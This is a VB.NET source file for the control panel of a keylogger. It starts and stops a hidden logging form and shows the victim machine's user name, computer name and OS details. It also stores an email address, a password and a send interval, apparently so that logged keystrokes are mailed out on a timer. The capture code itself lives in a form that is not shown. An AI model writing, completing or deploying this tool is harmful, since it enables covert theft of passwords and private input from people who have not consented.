Public Class controlpanel
    Dim drag As Boolean
    Dim mousex As Integer
    Dim mousey As Integer

    Private Sub Form1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown
        drag = True
        mousex = Windows.Forms.Cursor.Position.X - Me.Left
        mousey = Windows.Forms.Cursor.Position.Y - Me.Top
    End Sub

    Private Sub Form1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseMove
        If drag Then
            Me.Top = Windows.Forms.Cursor.Position.Y - mousey
            Me.Left = Windows.Forms.Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub Form1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseUp
        drag = False
    End Sub



    Private Sub controlpanel_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button2.Enabled = False
        TextBox1.Text = "User Name:     " + Environment.UserName.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Computer Name:     " + Environment.MachineName.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Screen:     " + My.Computer.Screen.WorkingArea.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "OS Version:     " + Environment.OSVersion.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Total Physical Memory:     " + My.Computer.Info.TotalPhysicalMemory.ToString
        TextBox1.Text = TextBox1.Text + vbNewLine + "Remain Physical Memory:     " + My.Computer.Info.AvailablePhysicalMemory.ToString
        Label1.Text = "Welcome, " + My.Settings.USER
        TextBox4.Refresh()
        If My.Settings.mailpass = vbNullString Then
            Label9.Visible = True
        End If
    End Sub


    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Me.Close()
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        Me.Hide()

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TextBox1.Text = TextBox1.Text + vbNewLine + "keylogger started at: " & Now
        Form1.Timer2.Interval = My.Settings.time * 60000
        Form1.Show()
        Form1.Hide()
        Button1.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        TextBox1.Text &= vbNewLine & "keylogger stopped at: " & Now
        Form1.Close()
        Button1.Enabled = True
        Button2.Enabled = False
    End Sub


    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        TrackBar1.Minimum = 1
        TrackBar1.Maximum = 10
        TextBox4.Text = TrackBar1.Value


    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If Not (TextBox3.Text = vbNullString) And Not (TextBox2.Text = vbNullString) Then
            My.Settings.mail = TextBox3.Text
            My.Settings.mailpass = TextBox2.Text
            My.Settings.time = TrackBar1.Value
            My.Settings.Save()
            Form1.Timer2.Interval = My.Settings.time * 60000
            Label8.Text = "Settings has been saved!"
        End If
    End Sub

  
    Private Sub TextBox1_TextChanged_1(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        TextBox1.ScrollBars = ScrollBars.Vertical
    End Sub
End Class

